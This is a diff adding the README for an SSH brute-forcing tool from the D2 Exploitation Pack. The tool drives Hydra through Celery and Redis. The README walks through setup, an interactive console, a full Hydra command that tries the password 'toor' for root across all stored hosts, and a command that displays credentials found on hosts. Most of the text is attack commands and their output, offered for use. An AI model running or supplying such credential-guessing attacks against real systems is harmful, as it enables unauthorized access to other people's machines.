@@ -1,0 +1,68 @@
+D2 Exploitation Pack
+=====================
+
+Copyright (c) 2007-2014 DSquare Security, LLC
+
+License information
+--------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Description
+--------------
+
+d2sec_celery_ssh is a asynchronous ssh bruteforcer, using celery, redis and
+hydra :
+- Celery : http://www.celeryproject.org/
+- Redis : http://redis.io/
+- Hydra : https://www.thc.org/thc-hydra/
+
+It's useful to run a ssh bruteforce on the complete database with a new host, a
+new user or a new pass. To each bruteforce, a task will start in background.
+
+Usage
+-------
+
+1. First, start Redis. For example, on an Arch Linux in a console: 
+$ /usr/bin/redis-server /etc/redis.conf
+
+2. Second, start Celery. For example, on an Arch Linux in a console: 
+$ celery2 -A tasks worker -B --loglevel=info
+
+3. Third, start d2sec_celery_ssh and insert a couple of data (ip/host or
+ip/pass or host/pass)
+
+$ ./run.py
+/run.py 
+20:19:45 client                         INFO     - Starting console UI for D2BFK-0.0.1 ...
+20:19:45 client                         INFO     - Interactive console started. Type ? or help for a list of commmands.
+d2bfk$ insert hosts 10.0.0.1
+d2bfk$ insert users root
+
+4. Quarter, run your first ssh bruteforce with a new pass in this example :
+
+d2bfk$ pass toor
+20:22:15 client                         INFO     - Start BF NEW pass with ALL hosts and ALL users
+20:22:15 client                         INFO     - Task: hydra -M logs/1417634535_hosts -L logs/1417634535_users -p toor -u -e sr -o results/1417634535 ssh
+
+To finish, there's the result command to display found credentials on hosts.
+
+The display command is used to display data in tables hosts, users and pass :
+
+d2bfk$ display
+20:27:58 client                         WARNING  - display <table>
+20:27:58 client                         WARNING  - __with__ table:
+20:27:58 client                         WARNING  -   hosts : hosts table
+20:27:58 client                         WARNING  -   users : login table
+20:27:58 client                         WARNING  -   pass  : password table
+d2bfk$ display hosts
+20:28:17 lib.db                         INFO     - DUMP TABLES hosts FROM databases/d2bfs.db
++---------------+
+| id | val      |
++----+----------+
+| 1  | 10.0.0.1 |
++---------------+
+     1 row in set
+
